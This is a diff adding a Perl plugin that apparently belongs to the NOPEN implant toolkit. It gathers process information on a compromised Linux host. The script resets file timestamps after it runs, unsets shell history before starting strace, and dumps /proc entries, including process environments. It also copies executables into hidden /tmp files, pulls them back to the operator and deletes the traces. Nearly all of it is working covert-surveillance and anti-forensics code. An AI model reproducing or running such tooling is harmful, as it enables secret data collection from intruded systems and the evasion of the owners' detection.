@@ -1,0 +1,346 @@
+#!/usr/bin/env perl 
+##
+$VER="1.0.0.3";
+##TODO:
+##Heuristics, show abnormal settings/processes
+##Compare running process with on disk exe
+##Handle multi runs of strace with the same time
+##so the data doesn't get overwritten
+
+
+$| = 1 ;
+myinit() ;
+
+my ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+    $serverver,$targetwdir,$targetos,$targetcwd,$targetpid,$targetppid,$targetport)
+  =  parsestatus(force);
+
+
+#saving off times to setback after script calls them
+($output,$nopenlines,@output) = nopenlss("-UPQ","strace","kill","pgrep","cat","echo","tr","cp");
+mydie("Missing required for $prog") if (@output  =~ /(cat|tr|echo|strace|kill|pgrep|cp){7,}/);
+my $list = "";
+foreach (@output) {
+  my $file = "";
+  $file = $2 if
+    (m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+[^/]+\s+(/.*), or
+     m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+[^/]+\s+(\./.*), or
+     m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d+\s+\d+:\d+\s+\d{4}\s+(.*),);
+  #still need to fix this so awk will be captured and touch properly...
+  next if $file =~ /-/;
+  $list .= " $file" if $file;
+}
+($output,$nopenlines,@touchlines) = doit("-ls -n$list");
+
+
+pid_info() if (!$pskip);
+strace_pid() if ($trace); 
+get_exe() if ($getexe);
+
+doit(@touchlines);
+
+filepopup("$opdown/strace.$pinfopid.$ttime.$nopen_rhostname",
+	  "-geometry 208x28+0+26 -title \"strace.$pinfopid.$ttime.$nopen_rhostname\""
+	 ) if (-e "$opdown/strace.$pinfopid.$ttime.$nopen_rhostname" && $pid_info_done);
+filepopup("$opdown/$prog.$pinfopid.$nopen_rhostname",
+	  "-geometry 208x28+1-26 -title \"$prog $prog.$pinfopid.$nopen_rhostname\""
+	 ) if (-e "$opdown/$prog.$pinfopid.$nopen_rhostname" && $strace_pid_done);
+		
+$filepastable = "
+$prog complete. 
+Process Info: $opdown/$prog.$pinfopid.$nopen_rhostname
+strace: $opdown/strace.$pinfopid.$ttime.$nopen_rhostname
+exe: $opdown/$nopen_rhostname$ptmpfile";
+dolocalecho("$filepastable");
+
+
+# Called via do so must end with 1;
+1;
+
+sub get_exe {
+
+  #TODO:
+  #cksum on /proc/pid/exe and its target/ps path
+  #string info from exe
+  #find a better way to pull exe out of proc
+
+  #This return is really unnessecary since it 
+  #would not pull back the exe of every process
+  #only the one given with -p PID - but serves 
+  #as a decent warning to the user.
+  if ($processall) {
+    return mywarn("Will not get exe with -a");
+  }
+  ;
+
+  ($output,$nopenlines,@output) = doit("-ls /proc/$pinfopid/exe");
+  dbg("in $prog, got line =$output=");
+  unless ($output =~ /^.*\s+(\d+)\s\D.*\s(\S+)\s-.*/) {
+    mydie("Unable to locate entry in /proc pid $pinfopid - bailing!");
+  }
+  my $srcbin = "/proc/$pinfopid/exe";
+	
+  #check copy path, copy file to tmp, pullback, etc..
+  # Make sure $ptmpfile not there already
+  $ptmpfile = "/tmp/.$pinfopid";
+  while (1) {
+    my ($output) = doit("-ls $ptmpfile");
+    last if (length $output < 3);
+    $ptmpfile .= $$;
+  }
+  my $dotptmpfile = dotdotpathforfile($ptmpfile);
+
+  doit("cp $srcbin $ptmpfile",
+       "-get $ptmpfile",
+       "-rm $dotptmpfile",
+      );
+  $get_exe_done = 1;
+}
+
+sub strace_pid {
+	
+  my $stoutput = "/tmp/.s";
+
+  if ($processall) {
+    return mywarn("Will not trace with -a");
+  }
+
+  # Make sure $stoutput not there already
+  while (1) {
+    my ($output) = doit("-ls $stoutput");
+    last if (length $output < 3);
+    $stoutput .= $$;
+  }
+  my $dotstoutput = dotdotpathforfile($stoutput);
+	
+  #running strace on pid, then finding pid to kill
+  doit("sh -c \"unset HISTFILE HISTFILESIZE HISTSIZE ; strace -p $pinfopid -r -i -ttt -f -ff -o $stoutput 1>&- 2>&- &\"");
+
+  #get strace pid after executing and get ready to kill...
+  my ($skpid,$nopenlines,@output) = doit("pgrep -u root strace");
+  doit("ps -ef | grep -v grep | grep strace");
+  chomp($skpid);
+  $skpid =~ s,[\n\r], ,g;
+  if ($skpid =~ /\s/) {
+    doit("=psg strace");
+    offerabort("This is odd, there is more than one PID output by the above pgrep.\n\n".
+	       "Continue at your own risk.");
+  }
+  my $starttime = time();
+  if (@output == 1) {
+    my $more = "\n\nSince $ttime is more than $tickletime, we will tickle the window every $tickletime seconds.\n\n".
+      "To stop $prog before $endtimestr, run this locally:\n\n".
+      "                   touch $stopfile"
+	if ($ttime > $tickletime);
+    mywarn("Now waiting $ttime seconds until we kill strace. Don't freak out!$more");
+    my $sleepleft = $ttime;
+    while ($sleepleft-- >= 0) {
+      if (-f $stopfile or -f $otherstopfile) {
+	progprint("STOPPING EARLY");
+	unlink($stopfile) if (-f $stopfile);
+	unlink($otherstopfile) if (-f $otherstopfile);
+	last;
+      }
+      sleep 1;
+      unless ( (time() - $starttime) % 120 ) {
+    	$more = "\n\nWe will tickle the window every $tickletime seconds with a \"$ticklecmd\".\n\n".
+          "To stop $prog before $endtimestr, run this locally:\n\n".
+	  "                   touch $stopfile";
+	mywarn("Still $sleepleft seconds until we kill strace. Don't freak out!$more");
+      }
+      tickleifneedbe(0,$ticklecmd,$tickletime);
+    }
+    preservefile("$opdown/strace.$pinfopid.$ttime.$nopen_rhostname");
+    doit("kill $skpid","-get $stoutput",
+	 "-lsh mv -v $opdown/$nopen_rhostname$stoutput $opdown/strace.$pinfopid.$ttime.$nopen_rhostname ; ls -al $opdown/strace.$pinfopid.$ttime.$nopen_rhostname",
+	 "-rm $dotstoutput");
+  } else {
+    mydie("Something went wrong: killpid = \"$skpid\" and is not valid. Find strace and kill it.");
+  }
+  $strace_pid_done = 1;
+}
+
+sub pid_info {
+		
+  #	return mywarn("Already ran pinfo on $pinfopid")
+  #		if -e "$opdown/$prog.$pinfopid.$nopen_rhostname";
+  preservefile("$opdown/$prog.$pinfopid.$nopen_rhostname");
+
+  #after file test to make sure it doesn't exist, open our log file
+  open PLOG, ">>", "$opdown/$prog.$pinfopid.$nopen_rhostname";
+
+  my ($output,$nopenlines,@output) = doit("lsof -n -P -p $pinfopid");
+  print PLOG "::::::::::::::\nlsof -n -P -p $pinfopid\n::::::::::::::\n$output";
+	
+  if ($processall) {
+    ($processoutput,$nopenlines,@processoutput) = nopenlss("-UFRQ","/proc/");
+  } elsif ($rpid) {
+		($processoutput,$nopenlines,@processoutput) = nopenlss("-UFRQ","/proc/$pinfopid");
+		($output,$nopenlines,@output) = doit("-ls -R /proc/$pinfopid");
+    print PLOG "::::::::::::::\n-ls -R /proc/$pinfopid\n:::::::::::::::\n$output"
+	} else {
+    ($processoutput,$nopenlines,@processoutput) = nopenlss("-UFQ","/proc/$pinfopid");
+    ($output,$nopenlines,@output) = doit("-ls -R /proc/$pinfopid");
+    print PLOG "::::::::::::::\n-ls -R /proc/$pinfopid\n:::::::::::::::\n$output";
+  }
+	
+  foreach $line ( @processoutput ) {
+    if ($line =~ /^-/) {
+      ($fld1,$fld2) = split /\s+\//, $line;
+      next if $fld2 =~ /(attr|kmsg|mem|kcore|pagemap)/;
+      if ($line =~ /environ/) {
+	#($output,$nopenlines,@output) = doit("(cat /$fld2;echo) | tr '\\000' '\\n';echo");
+	#($output,$nopenlines,@output) = doit("(cat /$fld2;echo) | tr -d '\\000' ;echo");
+	($output,$nopenlines,@output) = doit("(cat /$fld2;echo) | tr '\\000' '\\n' | uniq ;echo");
+	print PLOG "\n::::::::::::::\n/$fld2\n::::::::::::::\n$output";
+      } else { 
+	($output,$nopenlines,@output) = doit("cat /$fld2;echo");
+	print PLOG "\n::::::::::::::\n/$fld2\n::::::::::::::\n$output";
+      }
+    }
+  }
+  close PLOG;
+  $pid_info_done = 1;
+}
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0 unless $calledviarequire;
+  $stoiccmd = "called as: -gs pinfo @ARGV";
+  if ($willautoport and $socket) {
+    $stoiccmd = "in $prog, called as: pinfo(@ARGV)";
+    dbg("via require autopinfo ARGV=(
+".join("\n",@ARGV)."
+) prog=$prog");
+    #    progprint("$prog called -gs pinfo @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $prog = "-gs pinfo";
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $vertext = "$prog version $VER\n" ;
+  }
+  clearallopts();
+  $vertext = "$prog version $VER\n" ;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			    -e $nopen_mylog);
+
+  my $origoptions = "@ARGV";
+  mydie("bad option(s)") if (! Getopts( "rhavsetm:p:C:D:" ) ) ;
+  
+  ###########################################################################
+  # PROCESS ARGUMENTS
+  ###########################################################################
+
+	
+  usage() if ($opt_h or $opt_v);
+	
+  mydie("$prog can only be run on linux at this time") if !$linuxtarget;
+
+  $pskip = $opt_s;
+  $getexe = $opt_e;
+  if ($processall = $opt_a) {
+    $pinfopid = "ALL";
+  } else {
+    if (!$opt_p) {
+      mydie("-p must be defined");
+    } else {
+      $pinfopid = $opt_p;
+    }
+  }
+  $trace = $opt_t;
+  if ($opt_C) {
+    $ticklecmd = $opt_C;
+  } else {
+    $ticklecmd = "w";
+  }
+  if ($opt_D) {
+    $tickletime = strtoseconds($opt_D);
+  } else {
+    $tickletime = 30;
+  }
+  if ($opt_m) {
+    $ttime = strtoseconds($opt_m);
+  } else {
+    $ttime = 60;
+  }
+	if ($opt_r) {
+		$rpid = 1;
+	} else {
+		$rpid = 0;
+	}
+  mydie("-m $opt_M / -D $opt_D : These must be valid positive times")
+    unless($ttime > 0 and $tickletime > 0);
+
+
+  # Connect to autoport, we need status and more interactively.
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+
+
+  $stopfile = "$optmp/stop_$prog.$$";
+  $otherstopfile = $stopfile;
+  $otherstopfile =~ s,\d+$,all,;
+  $endtimestr = gmtime(time() + $ttime) . " GMT";
+  if ($ttime > 180) {
+    my $more = " ($opt_D)" if $opt_D;
+    my $more2 = secstostr($ttime);
+    offerabort( "${COLOR_FAILURE}CONFIRMING$COLOR_NORMAL this since you are running strace for over three minutes\n".
+		"(stop time will be$COLOR_FAILURE $endtimestr$COLOR_NORMAL).\n\n".
+		"We are about to run strace on PID $pinfopid for $ttime seconds ($more2),\n".
+		"longer than the default.\n\n".
+		"You should not lose the window, since we will be running \"$ticklecmd\" every\n".
+		"$tickletime seconds$more. You should probably only tie this window up that long\n".
+		"if you have at least one other active window on\n".
+		"$nopen_rhostname.\n\n".
+		"You can stop the running strace sooner by (locally) running either of:\n$COLOR_FAILURE\n".
+	  	"                   touch $stopfile\n".
+	  	"                   touch $otherstopfile","A");
+    unlink($stopfile,$otherstopfile);
+  }
+}
+
+sub setusagetexts {
+  # Separate long usage strings as separate function
+  $usagetext="
+Usage:  $prog -p PID [-e] [-t [-m TIME]] [-a] [-s]
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+";
+
+  $gsusagetext="
+Usage:  $prog -p PID [-e] [-t [-m TIME]] [-a] [-s] [-r]
+
+$prog gathers process information based upon the given PID. It will cat
+out information from /proc/PID to a local file. If tasked, the executable
+will be taken from memory and pulled back. Currently only works on Linux.
+
+
+  -a        Will iterate over /proc and pull info for all processes and kernel settings. 
+            NOTE: This will take some time to run and can freeze a NOPEN window.$COLOR_FAILURE Use Caution!$COLOR_NORMAL
+
+  -C CMD    Command(s) to run every -D seconds if -m TIME is more than 30s.           [w]
+  -D TIME   Delay between CMDs during ptrace run                                    [30s]
+  -e        Will copy exe from memory to /tmp, pull back and delete 
+  -m TIME   Length of time we run ptrace                                            [60s]
+  -p PID    PID of process you wish to gather info on
+  -s        Skips gathering process info. Use if you only want to do strace or get the exe.
+  -t        Invokes strace to watch a process for the -m TIME specified
+  -r        Recursive sort of /proc/pid. Default is to do only the top level.	
+
+NOTE: TIME arguments can be in the usual format:   [#d][#h][#m]#s
+
+Usage:  $prog -p PID [-e] [-t [-m TIME]] [-a] [-s] [-r]
+
+";
+}				#setusagetexts
